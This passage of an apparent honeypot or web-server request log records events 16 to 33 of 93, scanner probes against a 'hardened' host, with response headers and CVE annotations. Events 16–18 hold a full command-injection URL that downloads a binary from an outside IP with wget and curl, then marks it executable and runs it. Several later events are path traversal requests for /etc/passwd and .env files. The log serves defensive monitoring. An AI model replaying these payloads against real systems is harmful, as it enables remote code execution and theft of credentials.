+      Location: https://145.220.231.111:443/wp-admin/install.php
+      Permissions-Policy: geolocation=(), microphone=()
+      Referrer-Policy: strict-origin-when-cross-origin
+      Server: nginx/1.31.1
+      X-Content-Type-Options: nosniff
+      X-Frame-Options: SAMEORIGIN
+      X-Redirect-By: WordPress
+      X-Xss-Protection: 1; mode=block
+    Body (0 chars):
+    (empty)
+
+========================================================================
+EVENT #16 of 93
+========================================================================
+  Request ID:     1781020703095910948-3836
+  Timestamp:      2026-06-09T15:58:23.095912315Z
+  Client IP:      176.65.148.183
+  Method:         GET
+  Host:           145.220.231.108:443
+  URL:            /api/auth/validate-sso/..%2f..%2f..%2fproxy/users/api/v2/ucs/update/latest_package?pkg_name=x$(%0Acd+%2Ftmp+%7C%7C+cd+%2Fvar%2Frun+%7C%7C+cd+%2Fmnt+%7C%7C+cd+%2Froot+%7C%7C+cd+%2F%3B+busybox+wget+http%3A%2F%2F185.228.26.16%2Fzok+-O+zok%3B+curl+-o+zok+http%3A%2F%2F185.228.26.16%2Fzok%3B+wget+http%3A%2F%2F185.228.26.16%2Fzok%3B+chmod+777+zok%3B+.%2Fzok+unifi.exploit%0A)&by_cmd=true
+  Path:           /api/auth/validate-sso/../../../proxy/users/api/v2/ucs/update/latest_package
+  Query:          pkg_name=x$(%0Acd+%2Ftmp+%7C%7C+cd+%2Fvar%2Frun+%7C%7C+cd+%2Fmnt+%7C%7C+cd+%2Froot+%7C%7C+cd+%2F%3B+busybox+wget+http%3A%2F%2F185.228.26.16%2Fzok+-O+zok%3B+curl+-o+zok+http%3A%2F%2F185.228.26.16%2Fzok%3B+wget+http%3A%2F%2F185.228.26.16%2Fzok%3B+chmod+777+zok%3B+.%2Fzok+unifi.exploit%0A)&by_cmd=true
+  User-Agent:     Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36
+  Forwarded to:   https://localhost:8082
+  Experiment:     hardened
+  Likely CVE:     CVE-2024-3400 — Palo Alto PAN-OS GlobalProtect command injection (Palo Alto PAN-OS, confirmed)
+  Request headers:
+    Connection: close
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36
+  TLS version:    TLS 1.3
+  Cipher suite:   TLS_AES_128_GCM_SHA256
+  Response:
+    Status:       404 404 Not Found
+    Duration:     2 ms
+    Headers:
+      Content-Length: 278
+      Content-Type: text/html; charset=iso-8859-1
+      Date: Tue, 09 Jun 2026 15:58:23 GMT
+      Permissions-Policy: geolocation=(), microphone=()
+      Referrer-Policy: strict-origin-when-cross-origin
+      Server: nginx/1.31.1
+      X-Content-Type-Options: nosniff
+      X-Frame-Options: SAMEORIGIN
+      X-Xss-Protection: 1; mode=block
+    Body (278 chars):
+    <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+    <html><head>
+    <title>404 Not Found</title>
+    </head><body>
+    <h1>Not Found</h1>
+    <p>The requested URL was not found on this server.</p>
+    <hr>
+    <address>Apache/2.4.62 (Debian) Server at 145.220.231.108 Port 443</address>
+    </body></html>
+
+========================================================================
+EVENT #17 of 93
+========================================================================
+  Request ID:     1781027194852764239-4044
+  Timestamp:      2026-06-09T17:46:34.8527653Z
+  Client IP:      176.65.148.183
+  Method:         GET
+  Host:           145.220.231.109:443
+  URL:            /api/auth/validate-sso/..%2f..%2f..%2fproxy/users/api/v2/ucs/update/latest_package?pkg_name=x$(%0Acd+%2Ftmp+%7C%7C+cd+%2Fvar%2Frun+%7C%7C+cd+%2Fmnt+%7C%7C+cd+%2Froot+%7C%7C+cd+%2F%3B+busybox+wget+http%3A%2F%2F185.228.26.16%2Fzok+-O+zok%3B+curl+-o+zok+http%3A%2F%2F185.228.26.16%2Fzok%3B+wget+http%3A%2F%2F185.228.26.16%2Fzok%3B+chmod+777+zok%3B+.%2Fzok+unifi.exploit%0A)&by_cmd=true
+  Path:           /api/auth/validate-sso/../../../proxy/users/api/v2/ucs/update/latest_package
+  Query:          pkg_name=x$(%0Acd+%2Ftmp+%7C%7C+cd+%2Fvar%2Frun+%7C%7C+cd+%2Fmnt+%7C%7C+cd+%2Froot+%7C%7C+cd+%2F%3B+busybox+wget+http%3A%2F%2F185.228.26.16%2Fzok+-O+zok%3B+curl+-o+zok+http%3A%2F%2F185.228.26.16%2Fzok%3B+wget+http%3A%2F%2F185.228.26.16%2Fzok%3B+chmod+777+zok%3B+.%2Fzok+unifi.exploit%0A)&by_cmd=true
+  User-Agent:     Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36
+  Forwarded to:   https://localhost:8082
+  Experiment:     hardened
+  Likely CVE:     CVE-2024-3400 — Palo Alto PAN-OS GlobalProtect command injection (Palo Alto PAN-OS, confirmed)
+  Request headers:
+    Connection: close
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36
+  TLS version:    TLS 1.3
+  Cipher suite:   TLS_AES_128_GCM_SHA256
+  Response:
+    Status:       404 404 Not Found
+    Duration:     2 ms
+    Headers:
+      Content-Length: 278
+      Content-Type: text/html; charset=iso-8859-1
+      Date: Tue, 09 Jun 2026 17:46:34 GMT
+      Permissions-Policy: geolocation=(), microphone=()
+      Referrer-Policy: strict-origin-when-cross-origin
+      Server: nginx/1.31.1
+      X-Content-Type-Options: nosniff
+      X-Frame-Options: SAMEORIGIN
+      X-Xss-Protection: 1; mode=block
+    Body (278 chars):
+    <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+    <html><head>
+    <title>404 Not Found</title>
+    </head><body>
+    <h1>Not Found</h1>
+    <p>The requested URL was not found on this server.</p>
+    <hr>
+    <address>Apache/2.4.62 (Debian) Server at 145.220.231.109 Port 443</address>
+    </body></html>
+
+========================================================================
+EVENT #18 of 93
+========================================================================
+  Request ID:     1781027678946537246-4048
+  Timestamp:      2026-06-09T17:54:38.946538562Z
+  Client IP:      176.65.148.183
+  Method:         GET
+  Host:           145.220.231.105:443
+  URL:            /api/auth/validate-sso/..%2f..%2f..%2fproxy/users/api/v2/ucs/update/latest_package?pkg_name=x$(%0Acd+%2Ftmp+%7C%7C+cd+%2Fvar%2Frun+%7C%7C+cd+%2Fmnt+%7C%7C+cd+%2Froot+%7C%7C+cd+%2F%3B+busybox+wget+http%3A%2F%2F185.228.26.16%2Fzok+-O+zok%3B+curl+-o+zok+http%3A%2F%2F185.228.26.16%2Fzok%3B+wget+http%3A%2F%2F185.228.26.16%2Fzok%3B+chmod+777+zok%3B+.%2Fzok+unifi.exploit%0A)&by_cmd=true
+  Path:           /api/auth/validate-sso/../../../proxy/users/api/v2/ucs/update/latest_package
+  Query:          pkg_name=x$(%0Acd+%2Ftmp+%7C%7C+cd+%2Fvar%2Frun+%7C%7C+cd+%2Fmnt+%7C%7C+cd+%2Froot+%7C%7C+cd+%2F%3B+busybox+wget+http%3A%2F%2F185.228.26.16%2Fzok+-O+zok%3B+curl+-o+zok+http%3A%2F%2F185.228.26.16%2Fzok%3B+wget+http%3A%2F%2F185.228.26.16%2Fzok%3B+chmod+777+zok%3B+.%2Fzok+unifi.exploit%0A)&by_cmd=true
+  User-Agent:     Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36
+  Forwarded to:   https://localhost:8082
+  Experiment:     hardened
+  Likely CVE:     CVE-2024-3400 — Palo Alto PAN-OS GlobalProtect command injection (Palo Alto PAN-OS, confirmed)
+  Request headers:
+    Connection: close
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36
+  TLS version:    TLS 1.3
+  Cipher suite:   TLS_AES_128_GCM_SHA256
+  Response:
+    Status:       404 404 Not Found
+    Duration:     2 ms
+    Headers:
+      Content-Length: 278
+      Content-Type: text/html; charset=iso-8859-1
+      Date: Tue, 09 Jun 2026 17:54:38 GMT
+      Permissions-Policy: geolocation=(), microphone=()
+      Referrer-Policy: strict-origin-when-cross-origin
+      Server: nginx/1.31.1
+      X-Content-Type-Options: nosniff
+      X-Frame-Options: SAMEORIGIN
+      X-Xss-Protection: 1; mode=block
+    Body (278 chars):
+    <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+    <html><head>
+    <title>404 Not Found</title>
+    </head><body>
+    <h1>Not Found</h1>
+    <p>The requested URL was not found on this server.</p>
+    <hr>
+    <address>Apache/2.4.62 (Debian) Server at 145.220.231.105 Port 443</address>
+    </body></html>
+
+========================================================================
+EVENT #19 of 93
+========================================================================
+  Request ID:     1781032131414742140-4142
+  Timestamp:      2026-06-09T19:08:51.414743081Z
+  Client IP:      8.222.225.103
+  Method:         GET
+  Host:           145.220.231.107:443
+  URL:            /index.php?lang=../../../../../../../../tmp/index1
+  Path:           /index.php
+  Query:          lang=../../../../../../../../tmp/index1
+  User-Agent:     Custom-AsyncHttpClient
+  Forwarded to:   https://localhost:8082
+  Experiment:     hardened
+  Request headers:
+    Accept: */*
+    Connection: keep-alive
+    Upgrade-Insecure-Requests: 1
+    User-Agent: Custom-AsyncHttpClient
+  TLS version:    TLS 1.3
+  Cipher suite:   TLS_AES_128_GCM_SHA256
+  Response:
+    Status:       301 301 Moved Permanently
+    Duration:     11 ms
+    Headers:
+      Connection: keep-alive
+      Content-Length: 0
+      Content-Type: text/html; charset=UTF-8
+      Date: Tue, 09 Jun 2026 19:08:51 GMT
+      Location: https://145.220.231.107:443/?lang=../../../../../../../../tmp/index1
+      Permissions-Policy: geolocation=(), microphone=()
+      Referrer-Policy: strict-origin-when-cross-origin
+      Server: nginx/1.31.1
+      X-Content-Type-Options: nosniff
+      X-Frame-Options: SAMEORIGIN
+      X-Redirect-By: WordPress
+      X-Xss-Protection: 1; mode=block
+    Body (0 chars):
+    (empty)
+
+========================================================================
+EVENT #20 of 93
+========================================================================
+  Request ID:     1781107721627314755-5544
+  Timestamp:      2026-06-10T16:08:41.627315611Z
+  Client IP:      204.76.203.51
+  Method:         GET
+  Host:           145.220.231.107:443
+  URL:            /..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+  Path:           /../../../../../../etc/passwd
+  User-Agent:     Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0
+  Forwarded to:   https://localhost:8082
+  Experiment:     hardened
+  Request headers:
+    Accept: */*
+    Connection: close
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0
+  TLS version:    TLS 1.3
+  Cipher suite:   TLS_AES_128_GCM_SHA256
+  Response:
+    Status:       400 400 Bad Request
+    Duration:     2 ms
+    Headers:
+      Content-Length: 157
+      Content-Type: text/html
+      Date: Wed, 10 Jun 2026 16:08:41 GMT
+      Permissions-Policy: geolocation=(), microphone=()
+      Referrer-Policy: strict-origin-when-cross-origin
+      Server: nginx/1.31.1
+      X-Content-Type-Options: nosniff
+      X-Frame-Options: SAMEORIGIN
+      X-Xss-Protection: 1; mode=block
+    Body (157 chars):
+    <html>
+    <head><title>400 Bad Request</title></head>
+    <body>
+    <center><h1>400 Bad Request</h1></center>
+    <hr><center>nginx/1.31.1</center>
+    </body>
+    </html>
+
+========================================================================
+EVENT #21 of 93
+========================================================================
+  Request ID:     1781108455916767572-5550
+  Timestamp:      2026-06-10T16:20:55.916768693Z
+  Client IP:      204.76.203.51
+  Method:         GET
+  Host:           145.220.231.105:443
+  URL:            /..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+  Path:           /../../../../../../etc/passwd
+  User-Agent:     Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0
+  Forwarded to:   https://localhost:8082
+  Experiment:     hardened
+  Request headers:
+    Accept: */*
+    Connection: close
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0
+  TLS version:    TLS 1.3
+  Cipher suite:   TLS_AES_128_GCM_SHA256
+  Response:
+    Status:       400 400 Bad Request
+    Duration:     2 ms
+    Headers:
+      Content-Length: 157
+      Content-Type: text/html
+      Date: Wed, 10 Jun 2026 16:20:55 GMT
+      Permissions-Policy: geolocation=(), microphone=()
+      Referrer-Policy: strict-origin-when-cross-origin
+      Server: nginx/1.31.1
+      X-Content-Type-Options: nosniff
+      X-Frame-Options: SAMEORIGIN
+      X-Xss-Protection: 1; mode=block
+    Body (157 chars):
+    <html>
+    <head><title>400 Bad Request</title></head>
+    <body>
+    <center><h1>400 Bad Request</h1></center>
+    <hr><center>nginx/1.31.1</center>
+    </body>
+    </html>
+
+========================================================================
+EVENT #22 of 93
+========================================================================
+  Request ID:     1781110487768802375-6089
+  Timestamp:      2026-06-10T16:54:47.768803405Z
+  Client IP:      151.243.150.23
+  Method:         GET
+  Host:           145.220.231.109
+  URL:            /../.env
+  Path:           /../.env
+  User-Agent:     Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  Forwarded to:   https://localhost:8082
+  Experiment:     hardened
+  Likely CVE:     TECH-ENV-EXPOSURE — Exposed environment file (.env) (Application configuration, confirmed)
+  Request headers:
+    Accept: */*
+    Accept-Encoding: gzip
+    User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  TLS version:    TLS 1.3
+  Cipher suite:   TLS_AES_128_GCM_SHA256
+  Response:
+    Status:       400 400 Bad Request
+    Duration:     71 ms
+    Headers:
+      Content-Length: 157
+      Content-Type: text/html
+      Date: Wed, 10 Jun 2026 16:54:47 GMT
+      Permissions-Policy: geolocation=(), microphone=()
+      Referrer-Policy: strict-origin-when-cross-origin
+      Server: nginx/1.31.1
+      X-Content-Type-Options: nosniff
+      X-Frame-Options: SAMEORIGIN
+      X-Xss-Protection: 1; mode=block
+    Body (157 chars):
+    <html>
+    <head><title>400 Bad Request</title></head>
+    <body>
+    <center><h1>400 Bad Request</h1></center>
+    <hr><center>nginx/1.31.1</center>
+    </body>
+    </html>
+
+========================================================================
+EVENT #23 of 93
+========================================================================
+  Request ID:     1781110487774083356-6100
+  Timestamp:      2026-06-10T16:54:47.774084121Z
+  Client IP:      151.243.150.23
+  Method:         GET
+  Host:           145.220.231.109
+  URL:            /../../.env
+  Path:           /../../.env
+  User-Agent:     Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  Forwarded to:   https://localhost:8082
+  Experiment:     hardened
+  Likely CVE:     TECH-ENV-EXPOSURE — Exposed environment file (.env) (Application configuration, confirmed)
+  Request headers:
+    Accept: */*
+    Accept-Encoding: gzip
+    User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  TLS version:    TLS 1.3
+  Cipher suite:   TLS_AES_128_GCM_SHA256
+  Response:
+    Status:       400 400 Bad Request
+    Duration:     66 ms
+    Headers:
+      Content-Length: 157
+      Content-Type: text/html
+      Date: Wed, 10 Jun 2026 16:54:47 GMT
+      Permissions-Policy: geolocation=(), microphone=()
+      Referrer-Policy: strict-origin-when-cross-origin
+      Server: nginx/1.31.1
+      X-Content-Type-Options: nosniff
+      X-Frame-Options: SAMEORIGIN
+      X-Xss-Protection: 1; mode=block
+    Body (157 chars):
+    <html>
+    <head><title>400 Bad Request</title></head>
+    <body>
+    <center><h1>400 Bad Request</h1></center>
+    <hr><center>nginx/1.31.1</center>
+    </body>
+    </html>
+
+========================================================================
+EVENT #24 of 93
+========================================================================
+  Request ID:     1781110487775316789-6106
+  Timestamp:      2026-06-10T16:54:47.775317454Z
+  Client IP:      151.243.150.23
+  Method:         GET
+  Host:           145.220.231.109
+  URL:            /../../../.env
+  Path:           /../../../.env
+  User-Agent:     Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  Forwarded to:   https://localhost:8082
+  Experiment:     hardened
+  Likely CVE:     TECH-ENV-EXPOSURE — Exposed environment file (.env) (Application configuration, confirmed)
+  Request headers:
+    Accept: */*
+    Accept-Encoding: gzip
+    User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  TLS version:    TLS 1.3
+  Cipher suite:   TLS_AES_128_GCM_SHA256
+  Response:
+    Status:       400 400 Bad Request
+    Duration:     61 ms
+    Headers:
+      Content-Length: 157
+      Content-Type: text/html
+      Date: Wed, 10 Jun 2026 16:54:47 GMT
+      Permissions-Policy: geolocation=(), microphone=()
+      Referrer-Policy: strict-origin-when-cross-origin
+      Server: nginx/1.31.1
+      X-Content-Type-Options: nosniff
+      X-Frame-Options: SAMEORIGIN
+      X-Xss-Protection: 1; mode=block
+    Body (157 chars):
+    <html>
+    <head><title>400 Bad Request</title></head>
+    <body>
+    <center><h1>400 Bad Request</h1></center>
+    <hr><center>nginx/1.31.1</center>
+    </body>
+    </html>
+
+========================================================================
+EVENT #25 of 93
+========================================================================
+  Request ID:     1781110487776465844-6110
+  Timestamp:      2026-06-10T16:54:47.776466577Z
+  Client IP:      151.243.150.23
+  Method:         GET
+  Host:           145.220.231.109
+  URL:            /../../../../.env
+  Path:           /../../../../.env
+  User-Agent:     Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  Forwarded to:   https://localhost:8082
+  Experiment:     hardened
+  Likely CVE:     TECH-ENV-EXPOSURE — Exposed environment file (.env) (Application configuration, confirmed)
+  Request headers:
+    Accept: */*
+    Accept-Encoding: gzip
+    User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  TLS version:    TLS 1.3
+  Cipher suite:   TLS_AES_128_GCM_SHA256
+  Response:
+    Status:       400 400 Bad Request
+    Duration:     60 ms
+    Headers:
+      Content-Length: 157
+      Content-Type: text/html
+      Date: Wed, 10 Jun 2026 16:54:47 GMT
+      Permissions-Policy: geolocation=(), microphone=()
+      Referrer-Policy: strict-origin-when-cross-origin
+      Server: nginx/1.31.1
+      X-Content-Type-Options: nosniff
+      X-Frame-Options: SAMEORIGIN
+      X-Xss-Protection: 1; mode=block
+    Body (157 chars):
+    <html>
+    <head><title>400 Bad Request</title></head>
+    <body>
+    <center><h1>400 Bad Request</h1></center>
+    <hr><center>nginx/1.31.1</center>
+    </body>
+    </html>
+
+========================================================================
+EVENT #26 of 93
+========================================================================
+  Request ID:     1781110487776656023-6111
+  Timestamp:      2026-06-10T16:54:47.776656636Z
+  Client IP:      151.243.150.23
+  Method:         GET
+  Host:           145.220.231.109
+  URL:            /../.env.production
+  Path:           /../.env.production
+  User-Agent:     Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  Forwarded to:   https://localhost:8082
+  Experiment:     hardened
+  Likely CVE:     TECH-ENV-EXPOSURE — Exposed environment file (.env) (Application configuration, confirmed)
+  Request headers:
+    Accept: */*
+    Accept-Encoding: gzip
+    User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  TLS version:    TLS 1.3
+  Cipher suite:   TLS_AES_128_GCM_SHA256
+  Response:
+    Status:       400 400 Bad Request
+    Duration:     62 ms
+    Headers:
+      Content-Length: 157
+      Content-Type: text/html
+      Date: Wed, 10 Jun 2026 16:54:47 GMT
+      Permissions-Policy: geolocation=(), microphone=()
+      Referrer-Policy: strict-origin-when-cross-origin
+      Server: nginx/1.31.1
+      X-Content-Type-Options: nosniff
+      X-Frame-Options: SAMEORIGIN
+      X-Xss-Protection: 1; mode=block
+    Body (157 chars):
+    <html>
+    <head><title>400 Bad Request</title></head>
+    <body>
+    <center><h1>400 Bad Request</h1></center>
+    <hr><center>nginx/1.31.1</center>
+    </body>
+    </html>
+
+========================================================================
+EVENT #27 of 93
+========================================================================
+  Request ID:     1781110487776656701-6112
+  Timestamp:      2026-06-10T16:54:47.776657431Z
+  Client IP:      151.243.150.23
+  Method:         GET
+  Host:           145.220.231.109
+  URL:            /../.env.local
+  Path:           /../.env.local
+  User-Agent:     Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  Forwarded to:   https://localhost:8082
+  Experiment:     hardened
+  Likely CVE:     TECH-ENV-EXPOSURE — Exposed environment file (.env) (Application configuration, confirmed)
+  Request headers:
+    Accept: */*
+    Accept-Encoding: gzip
+    User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  TLS version:    TLS 1.3
+  Cipher suite:   TLS_AES_128_GCM_SHA256
+  Response:
+    Status:       400 400 Bad Request
+    Duration:     64 ms
+    Headers:
+      Content-Length: 157
+      Content-Type: text/html
+      Date: Wed, 10 Jun 2026 16:54:47 GMT
+      Permissions-Policy: geolocation=(), microphone=()
+      Referrer-Policy: strict-origin-when-cross-origin
+      Server: nginx/1.31.1
+      X-Content-Type-Options: nosniff
+      X-Frame-Options: SAMEORIGIN
+      X-Xss-Protection: 1; mode=block
+    Body (157 chars):
+    <html>
+    <head><title>400 Bad Request</title></head>
+    <body>
+    <center><h1>400 Bad Request</h1></center>
+    <hr><center>nginx/1.31.1</center>
+    </body>
+    </html>
+
+========================================================================
+EVENT #28 of 93
+========================================================================
+  Request ID:     1781110487776961637-6113
+  Timestamp:      2026-06-10T16:54:47.776962505Z
+  Client IP:      151.243.150.23
+  Method:         GET
+  Host:           145.220.231.109
+  URL:            /../../.env.local
+  Path:           /../../.env.local
+  User-Agent:     Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  Forwarded to:   https://localhost:8082
+  Experiment:     hardened
+  Likely CVE:     TECH-ENV-EXPOSURE — Exposed environment file (.env) (Application configuration, confirmed)
+  Request headers:
+    Accept: */*
+    Accept-Encoding: gzip
+    User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  TLS version:    TLS 1.3
+  Cipher suite:   TLS_AES_128_GCM_SHA256
+  Response:
+    Status:       400 400 Bad Request
+    Duration:     61 ms
+    Headers:
+      Content-Length: 157
+      Content-Type: text/html
+      Date: Wed, 10 Jun 2026 16:54:47 GMT
+      Permissions-Policy: geolocation=(), microphone=()
+      Referrer-Policy: strict-origin-when-cross-origin
+      Server: nginx/1.31.1
+      X-Content-Type-Options: nosniff
+      X-Frame-Options: SAMEORIGIN
+      X-Xss-Protection: 1; mode=block
+    Body (157 chars):
+    <html>
+    <head><title>400 Bad Request</title></head>
+    <body>
+    <center><h1>400 Bad Request</h1></center>
+    <hr><center>nginx/1.31.1</center>
+    </body>
+    </html>
+
+========================================================================
+EVENT #29 of 93
+========================================================================
+  Request ID:     1781110488153429097-6334
+  Timestamp:      2026-06-10T16:54:48.153429613Z
+  Client IP:      151.243.150.23
+  Method:         GET
+  Host:           145.220.231.109
+  URL:            /..%5C.env
+  Path:           /..\.env
+  User-Agent:     Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  Forwarded to:   https://localhost:8082
+  Experiment:     hardened
+  Request headers:
+    Accept: */*
+    Accept-Encoding: gzip
+    User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  TLS version:    TLS 1.3
+  Cipher suite:   TLS_AES_128_GCM_SHA256
+  Response:
+    Status:       429 429 Too Many Requests
+    Duration:     0 ms
+    Headers:
+      Connection: keep-alive
+      Content-Length: 169
+      Content-Type: text/html
+      Date: Wed, 10 Jun 2026 16:54:48 GMT
+      Permissions-Policy: geolocation=(), microphone=()
+      Referrer-Policy: strict-origin-when-cross-origin
+      Server: nginx/1.31.1
+      X-Content-Type-Options: nosniff
+      X-Frame-Options: SAMEORIGIN
+      X-Xss-Protection: 1; mode=block
+    Body (169 chars):
+    <html>
+    <head><title>429 Too Many Requests</title></head>
+    <body>
+    <center><h1>429 Too Many Requests</h1></center>
+    <hr><center>nginx/1.31.1</center>
+    </body>
+    </html>
+
+========================================================================
+EVENT #30 of 93
+========================================================================
+  Request ID:     1781110497230253597-6951
+  Timestamp:      2026-06-10T16:54:57.230253949Z
+  Client IP:      151.243.150.23
+  Method:         GET
+  Host:           145.220.231.109
+  URL:            /..%5C..%5Cenv
+  Path:           /..\..\env
+  User-Agent:     Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  Forwarded to:   https://localhost:8082
+  Experiment:     hardened
+  Request headers:
+    Accept: */*
+    Accept-Encoding: gzip
+    User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  TLS version:    TLS 1.3
+  Cipher suite:   TLS_AES_128_GCM_SHA256
+  Response:
+    Status:       404 404 Not Found
+    Duration:     7 ms
+    Headers:
+      Connection: keep-alive
+      Content-Length: 277
+      Content-Type: text/html; charset=iso-8859-1
+      Date: Wed, 10 Jun 2026 16:54:57 GMT
+      Permissions-Policy: geolocation=(), microphone=()
+      Referrer-Policy: strict-origin-when-cross-origin
+      Server: nginx/1.31.1
+      X-Content-Type-Options: nosniff
+      X-Frame-Options: SAMEORIGIN
+      X-Xss-Protection: 1; mode=block
+    Body (277 chars):
+    <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+    <html><head>
+    <title>404 Not Found</title>
+    </head><body>
+    <h1>Not Found</h1>
+    <p>The requested URL was not found on this server.</p>
+    <hr>
+    <address>Apache/2.4.62 (Debian) Server at 145.220.231.109 Port 80</address>
+    </body></html>
+
+========================================================================
+EVENT #31 of 93
+========================================================================
+  Request ID:     1781110497230392411-6957
+  Timestamp:      2026-06-10T16:54:57.23039271Z
+  Client IP:      151.243.150.23
+  Method:         GET
+  Host:           145.220.231.109
+  URL:            /..%5C..%5C..%5Cenv
+  Path:           /..\..\..\env
+  User-Agent:     Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  Forwarded to:   https://localhost:8082
+  Experiment:     hardened
+  Request headers:
+    Accept: */*
+    Accept-Encoding: gzip
+    User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  TLS version:    TLS 1.3
+  Cipher suite:   TLS_AES_128_GCM_SHA256
+  Response:
+    Status:       404 404 Not Found
+    Duration:     6 ms
+    Headers:
+      Connection: keep-alive
+      Content-Length: 277
+      Content-Type: text/html; charset=iso-8859-1
+      Date: Wed, 10 Jun 2026 16:54:57 GMT
+      Permissions-Policy: geolocation=(), microphone=()
+      Referrer-Policy: strict-origin-when-cross-origin
+      Server: nginx/1.31.1
+      X-Content-Type-Options: nosniff
+      X-Frame-Options: SAMEORIGIN
+      X-Xss-Protection: 1; mode=block
+    Body (277 chars):
+    <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+    <html><head>
+    <title>404 Not Found</title>
+    </head><body>
+    <h1>Not Found</h1>
+    <p>The requested URL was not found on this server.</p>
+    <hr>
+    <address>Apache/2.4.62 (Debian) Server at 145.220.231.109 Port 80</address>
+    </body></html>
+
+========================================================================
+EVENT #32 of 93
+========================================================================
+  Request ID:     1781124659597837231-7436
+  Timestamp:      2026-06-10T20:50:59.597838444Z
+  Client IP:      204.76.203.51
+  Method:         GET
+  Host:           145.220.231.106:443
+  URL:            /..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+  Path:           /../../../../../../etc/passwd
+  User-Agent:     Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0
+  Forwarded to:   https://localhost:8082
+  Experiment:     hardened
+  Request headers:
+    Accept: */*
+    Connection: close
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0
+  TLS version:    TLS 1.3
+  Cipher suite:   TLS_AES_128_GCM_SHA256
+  Response:
+    Status:       400 400 Bad Request
+    Duration:     2 ms
+    Headers:
+      Content-Length: 157
+      Content-Type: text/html
+      Date: Wed, 10 Jun 2026 20:50:59 GMT
+      Permissions-Policy: geolocation=(), microphone=()
+      Referrer-Policy: strict-origin-when-cross-origin
+      Server: nginx/1.31.1
+      X-Content-Type-Options: nosniff
+      X-Frame-Options: SAMEORIGIN
+      X-Xss-Protection: 1; mode=block
+    Body (157 chars):
+    <html>
+    <head><title>400 Bad Request</title></head>
+    <body>
+    <center><h1>400 Bad Request</h1></center>
+    <hr><center>nginx/1.31.1</center>
+    </body>
+    </html>
+
+========================================================================
+EVENT #33 of 93
+========================================================================
+  Request ID:     1781171429817649079-8730
+  Timestamp:      2026-06-11T09:50:29.817649516Z
+  Client IP:      151.243.150.23
+  Method:         GET
+  Host:           145.220.231.110
+  URL:            /../.env
+  Path:           /../.env
+  User-Agent:     Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  Forwarded to:   https://localhost:8082
+  Experiment:     hardened
+  Likely CVE:     TECH-ENV-EXPOSURE — Exposed environment file (.env) (Application configuration, confirmed)
+  Request headers:
+    Accept: */*
+    Accept-Encoding: gzip
+    User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  TLS version:    TLS 1.3
+  Cipher suite:   TLS_AES_128_GCM_SHA256
+  Response:
+    Status:       400 400 Bad Request
+    Duration:     19 ms
+    Headers:
+      Content-Length: 157
+      Content-Type: text/html
+      Date: Thu, 11 Jun 2026 09:50:29 GMT
+      Permissions-Policy: geolocation=(), microphone=()
+      Referrer-Policy: strict-origin-when-cross-origin
+      Server: nginx/1.31.1
